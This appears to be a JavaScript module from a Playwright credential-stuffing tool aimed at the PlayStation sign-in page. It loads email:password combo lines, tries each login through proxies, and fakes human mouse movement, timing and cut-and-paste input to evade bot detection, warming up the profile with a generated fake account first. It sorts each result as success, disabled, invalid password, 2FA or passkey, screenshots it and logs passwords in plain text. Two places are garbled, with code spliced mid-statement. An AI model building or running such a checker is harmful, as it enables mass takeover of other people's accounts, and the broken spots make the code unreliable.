import fs from "node:fs/promises";
import fsSync from "node:fs";
import path from "node:path";
import axios from 'axios';
import { logger } from "../utils/logger.js";
import Constants from './Constants.js';
import HumanBehavior from './HumanBehavior.js';
import FakeAccountGenerator from './FakeAccountGenerator.js';
import PageHelpers from './PageHelpers.js';

export default class AccountProcessor {
    constructor(client) {
        this.client = client;
    }

    // ==================== Fake Account Processing ====================
    async processFakeAccount(context) {
        console.log("🎭 Processing fake account first to warm up the profile...");

        const fakeAccountLine = FakeAccountGenerator.generateFakeAccountLine();
        console.log(`🎭 Using faker-generated fake account: ${fakeAccountLine}`);

        let page = null;
        let retryCount = 0;

        while (retryCount < Constants.MAX_RETRIES + 1) {
            try {
                page = await context.newPage();
                console.log(`🎭 Attempt ${retryCount + 1}/${Constants.MAX_RETRIES + 1}: Loading page...`);

                await this._attemptPageLoad(page);
                break;

            } catch (gotoErr) {
                retryCount++;
                console.log(`🎭 Attempt ${retryCount}/${Constants.MAX_RETRIES + 1} failed:`, gotoErr.message);

                if (page) {
                    try { await page.close(); } catch { }
                    page = null;
                }

                if (this._isCriticalError(gotoErr, retryCount)) {
                    throw new Error('PROXY_CONNECTION_FAILED');
                }

                if (retryCount < Constants.MAX_RETRIES + 1) {
                    const waitTime = Constants.RETRY_BASE_DELAY * retryCount;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await HumanBehavior.sleep(waitTime);
                } else {
                    throw gotoErr;
                }
            }
        }

        await this._processFakeAccountLogin(page, fakeAccountLine);

        try {
            if (page) await page.close();
        } catch { }

        console.log("🎭 Fake account warming completed. Now starting real accounts...");
    }

    async _attemptPageLoad(page) {
        try {
            await page.goto(Constants.LOGIN_URL, { waitUntil: "networkidle", timeout: 30000 });
            console.log("✅ Page loaded with networkidle");
        } catch (networkIdleErr) {
            console.log("⚠️ NetworkIdle failed, trying with domcontentloaded...");
            try {
                await page.goto(Constants.LOGIN_URL, { waitUntil: "domcontentloaded", timeout: 20000 });
                console.log("✅ Page loaded with domcontentloaded");
            } catch (domErr) {
                console.log("⚠️ DOMContentLoaded failed, trying basic load...");
                await page.goto(Constants.LOGIN_URL, { waitUntil: "load", timeout: 25000 });
                console.log("✅ Page loaded with basic load");
            }
        }
    }

    _isCriticalError(gotoErr, retryCount) {
        const criticalErrors = [
            'net::ERR_EMPTY_RESPONSE',
            'net::ERR_CONNECTION_REFUSED',
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED'
        ];

        return criticalErrors.some(error => gotoErr.message.includes(error)) ||
               (gotoErr.message.includes('Timeout') && retryCount >= Constants.MAX_RETRIES + 1);
    }

    async _processFakeAccountLogin(page, fakeAccountLine) {
        await PageHelpers.waitFullLoadAndSettle(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));
        await HumanBehavior.randomMouseMovements(page);

        const submitSelector = "button[type=submit]";

        console.log("🎭 Processing fake email with copy-paste method...");

        let emailFrame;
        try {
            emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
        } catch (frameErr) {
            console.log("🎭 Email frame not found:", frameErr.message);

            if (frameErr.message.includes('Execution context was destroyed') ||
                frameErr.message.includes('Frame with selector') ||
                frameErr.message.includes('navigation')) {
                throw new Error('CONTEXT_DESTROYED');
            }

            throw frameErr;
        }

        const emailInput = PageHelpers.emailLocator(emailFrame);
        const cutPassword = await this._humanPasteEmail(page, emailInput, fakeAccountLine);

        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);

        console.log("🎭 Pasting fake password...");
        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 7500);
        const passInput = PageHelpers.passwordLocator(passFrame);

        await this._humanPastePassword(page, passInput, cutPassword);
        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);

        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000));
        const bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (bodyText.includes(`Can't connect to the server`)) {
            throw new Error('SERVER_CONNECTION_FAILED');
        }

        console.log("🎭 Fake account process completed (expected to fail)");

        const fakeAccountLogLine = `${fakeAccountLine}\n`;
        await fs.appendFile('./fake_accounts_used.txt', fakeAccountLogLine, "utf8");
    }

    // ==================== Real Account Processing ====================
    async processAccount(context, accountLine, tabIndex, accountsCount) {
        let page = null;
        const startTime = Date.now();

        try {
            logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
            const email = accountLine.split(':')[0];

            page = await this._createAndLoadPage(context, tabIndex, email);
            
            let timeoutRetryCount = 0;
            let finalResult = null;

            while (timeoutRetryCount <= Constants.MAX_TIMEOUT_RETRIES) {
                try {
                    if (timeoutRetryCount === 0) {
                        await this._initialPageSetup(page, tabIndex);
                    } else {
                        await this._refreshPageForRetry(page, tabIndex);
                    }

                    finalResult = await this._processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount);
                    
                    if (finalResult.shouldExit) {
                        return finalResult.result;
                    }
                    
                    if (finalResult) break;

                } catch (retryErr) {
                    logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);
                    
                    timeoutRetryCount++;
                    if (timeoutRetryCount > Constants.MAX_TIMEOUT_RETRIES) {
                        finalResult = {
                            email,
                            status: 'timeout-error',
                            responseTime: Date.now() - startTime,
                            tabIndex,
                            ret.setViewportSize({
                    width: 1200 + (tabIndex * 50),
                    height: 800 + (tabIndex * 30)
                });

                logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${attempt}/${Constants.MAX_RETRIES})...`);

                await page.goto(Constants.LOGIN_URL, {
                    waitUntil: "domcontentloaded",
                    timeout: Constants.PAGE_LOAD_TIMEOUT
                });

                const pageLoaded = await PageHelpers.waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
                if (!pageLoaded) {
                    throw new Error("Page did not load properly");
                }

                logger.info(`Tab ${tabIndex + 1}: ✅ Page loaded successfully!`);
                return page;

            } catch (gotoErr) {
                logger.error(`Tab ${tabIndex + 1}: Page load attempt ${attempt} failed: ${gotoErr.message}`);

                if (page) {
                    try { await page.close(); } catch { }
                    page = null;
                }

                if (attempt >= Constants.MAX_RETRIES) {
                    logger.error(`Tab ${tabIndex + 1}: All page load attempts failed for ${email}`);
                    throw new Error('PAGE_LOAD_FAILED');
                }

                await HumanBehavior.sleep(2000 * attempt + HumanBehavior.randomDelay(250, 750));
            }
        }
    }

    async _initialPageSetup(page, tabIndex) {
        if (Constants.WAIT_FOR_FULL_LOAD) {
            logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
        }

        await HumanBehavior.randomMouseMovements(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500) + (tabIndex * 300));
    }

    async _refreshPageForRetry(page, tabIndex) {
        logger.info(` Error("Page did not load properly after refresh");
        }

        logger.info(`Tab ${tabIndex + 1}: ✅ Page refreshed and loaded successfully!`);

        if (Constants.WAIT_FOR_FULL_LOAD) {
            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
        }

        await HumanBehavior.randomMouseMovements(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500));
    }

    async _processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount) {
        const email = accountLine.split(':')[0];
        const submitSelector = "button[type=submit]";

        logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
        
        const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 20000);
        const emailInput = PageHelpers.emailLocator(emailFrame);

        const cutPassword = await this._humanPasteEmail(page, emailInput, accountLine);
        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);

        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 20000);
        const passInput = PageHelpers.passwordLocator(passFrame);

        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);

        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000) + (tabIndex * 200));

        let bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (bodyText.includes(`Sign In with Passkey`)) {
            logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
            return {
                email,
                status: 'passkey',
                responseTime: Date.now() - startTime,
                tabIndex,
                retryCount: timeoutRetryCount
            };
        }

        await this._humanPastePassword(page, passInput, cutPassword);
        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);

        await HumanBehavior.sleep(3000 + HumanBehavior.randomDelay(500, 1500));
        bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (!bodyText) {
            await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
            bodyText = await page.evaluate(() => document.body?.innerText || "");
        }

        if ((bodyText.includes(`Can't connect to the server`) || bodyText.includes('device sent too many requests')) && accountsCount === tabIndex + 1) {
            logger.warn(`⏰ Tab ${tabIndex + 1}: Timeout detected for ${email}`);
            
            if (timeoutRetryCount >= Constants.MAX_TIMEOUT_RETRIES) {
                return {
                    shouldExit: true,
                    result: {
                        email,
                        status: 'timeout-error',
                        responseTime: Date.now() - startTime,
                        tabIndex,
                        retryCount: timeoutRetryCount,
                        message: 'Max timeout retries exceeded'
                    }
                };
            }

            throw new Error('Timeout detected, retrying...');
        }

        await PageHelpers.waitFullLoadAndSettle(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));

        const screenshotPath = await this._takeScreenshot(page, email, tabIndex, timeoutRetryCount);
        const status = this._determineLoginStatus(bodyText);

        const responseTime = Date.now() - startTime;
        logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms ${timeoutRetryCount > 0 ? `(with ${timeoutRetryCount} timeout retries)` : ''}`);

        return {
            email,
            status,
            responseTime,
            tabIndex,
            screenshot: screenshotPath,
            retryCount: timeoutRetryCount,
            additionalInfo: {
                bodyTextLength: bodyText.length,
                processingTime: responseTime,
                timeoutRetries: timeoutRetryCount
            }
        };
    }

    async _takeScreenshot(page, email, tabIndex, timeoutRetryCount) {
        try {
            const filename = `${email}---tab${tabIndex}---retry${timeoutRetryCount}---${Date.now()}.png`;
            return await PageHelpers.takeAdvancedScreenshot(page, filename);
        } catch (screenshotErr) {
            console.log(`⚠️ Screenshot failed: ${screenshotErr.message}`);
            return null;
        }
    }

    _determineLoginStatus(bodyText) {
        const statusChecks = [
            { text: 'This sign-in ID has been disabled', status: 'disabled' },
            { text: 'Please enter a correct sign-in ID', status: 'invalid-email' },
            { text: 'Please enter the correct password', status: 'invalid-password' },
            { text: 'Sign in to PlayStation', status: 'login-page' },
            { text: 'Account Management', status: 'success' },
            { text: 'Privacy Settings', status: 'success' },
            { text: 'Sign In with Passkey', status: 'passkey' },
            { text: 'Two-factor authentication', status: '2fa' },
            { text: 'verification code', status: '2fa' },
            { text: 'Enter the verification code', status: '2fa' }
        ];

        for (const check of statusChecks) {
            if (bodyText.includes(check.text)) {
                return check.status;
            }
        }

        return 'unknown';
    }

    // ==================== Input Handling ====================
    async _humanPasteEmail(page, locator, fullAccountLine) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, `input[type="email"]`);
        await HumanBehavior.humanClick(page, `input[type="email"]`);

        console.log("📋 Pasting full account line into email field...");

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 3000));
        await locator.fill(fullAccountLine);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        const lastColonIndex = fullAccountLine.lastIndexOf(':');
        if (lastColonIndex === -1) {
            throw new Error("Invalid account format - no colon found");
        }

        const password = fullAccountLine.substring(lastColonIndex + 1);

        console.log("✂️ Step 1: Cutting password part from email field...");

        await locator.press('End', { delay: HumanBehavior.randomDelay(50, 100) });

        const passwordLength = password.length;
        for (let i = 0; i < passwordLength; i++) {
            await locator.press('Shift+ArrowLeft', { delay: HumanBehavior.randomDelay(25, 50) });
        }

        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 250));
        await locator.press('Control+x', { delay: HumanBehavior.randomDelay(100, 150) });

        console.log(`✂️ Password "${password}" cut from email field`);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        console.log("🗑️ Step 2: Deleting colon (:) from email field...");
        await locator.press('Backspace', { delay: HumanBehavior.randomDelay(150, 250) });
        await HumanBehavior.sleep(HumanBehavior.randomDelay(300, 500));

        console.log("✅ Email field cleaned - only email remains");
        return password;
    }

    async _humanPastePassword(page, locator, password) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, `input[type="password"]`);
        await HumanBehavior.humanClick(page, `input[type="password"]`);

        console.log(`📋 Pasting password: ${password}`);

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(100, 200));
        await locator.fill(password);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(250, 400));

        console.log("✅ Password pasted successfully");
    }

    // ==================== File Management ====================
    static async loadAccountBatch(batchSize) {
        try {
            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
                console.log("❌ No accounts file found!");
                return [];
            }

            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
            const accounts = content
                .split("\n")
                .map(line => line.trim())
                .filter(Boolean);

            return accounts.slice(0, batchSize);
        } catch (err) {
            console.log("❌ Error loading accounts:", err.message);
            return [];
        }
    }

    static async removeProcessedAccounts(count) {
        try {
            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
                return;
            }

            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
            const accounts = content
                .split("\n")
                .map(line => line.trim())
                .filter(Boolean);

            const remainingAccounts = accounts.slice(count);
            const newContent = remainingAccounts.length > 0 ? remainingAccounts.join("\n") + "\n" : "";
            
            await fs.writeFile(Constants.ACCOUNTS_FILE, newContent, "utf8");
            console.log(`✅ Removed ${count} processed accounts from file`);
        } catch (err) {
            console.log("❌ Error removing processed accounts:", err.message);
        }
    }

    // ==================== Results Management ====================
    static async sendResultsToServer(results) {
        try {
            console.log(`📊 Sending ${results.length} results to server...`);

            // اینجا می‌تونید API call به سرور اضافه کنید
            // const response = await axios.post('/api/results', { results });

            console.log(`✅ Results sent to server successfully`);

            // ذخیره محلی هم برای backup
            const timestamp = new Date().toISOString();
            const logEntry = {
                timestamp,
                results,
                count: results.length
            };

            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');

        } catch (error) {
            console.log(`❌ Error sending results to server: ${error.message}`);

            // در صورت خطا، حداقل محلی ذخیره کن
            const timestamp = new Date().toISOString();
            const logEntry = {
                timestamp,
                results,
                count: results.length,
                error: error.message
            };

            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
        }
    }

    // ==================== Error Detection ====================
    static isCriticalError(error) {
        const criticalErrors = [
            'PROXY_CONNECTION_FAILED',
            'SERVER_CONNECTION_FAILED',
            'CONTEXT_DESTROYED'
        ];

        return criticalErrors.some(criticalError => 
            error.message && error.message.includes(criticalError)
        );
    }

    static isProxyError(errorMessage) {
        const proxyErrors = [
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED',
            'net::ERR_CONNECTION_REFUSED',
            'Failed to determine external IP address'
        ];

        return proxyErrors.some(proxyError => errorMessage.includes(proxyError));
    }
}